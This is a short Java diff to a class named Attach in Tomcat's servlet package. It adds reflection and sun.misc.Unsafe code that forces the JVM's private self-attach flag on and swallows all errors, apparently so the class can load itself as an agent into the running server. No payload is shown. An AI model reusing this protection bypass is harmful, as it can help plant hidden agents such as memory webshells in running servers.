@@ -1,8 +1,10 @@
 package org.apache.catalina.servlets;
 
+import java.lang.reflect.Field;
 import java.util.List;
 import com.sun.tools.attach.VirtualMachine;
 import com.sun.tools.attach.VirtualMachineDescriptor;
+import sun.misc.Unsafe;
 
 public class Attach {
 
@@ -14,8 +16,26 @@ public class Attach {
         att(agentArgs);
     }
 
+    private static void enableAttachSelf() {
+        try {
+            Unsafe unsafe = null;
+            try {
+                Field field1 = Unsafe.class.getDeclaredField("theUnsafe");
+                field1.setAccessible(true);
+                unsafe = (Unsafe)field1.get(null);
+            } catch (Exception e) {
+                throw new AssertionError(e);
+            }
+            Class<?> cls = Class.forName("sun.tools.attach.HotSpotVirtualMachine");
+            Field field = cls.getDeclaredField("ALLOW_ATTACH_SELF");
+            long fieldAddress = unsafe.staticFieldOffset(field);
+            unsafe.putBoolean(cls, fieldAddress, true);
+        } catch (Throwable throwable) {}
+    }
+
     public static void att(String agentArgs) throws Exception {
         boolean print = true;
+        enableAttachSelf();
         System.setProperty("jdk.attach.allowAttachSelf", "true");
         String agentFile = Attach.class.getProtectionDomain().getCodeSource().getLocation().getFile();
         try {
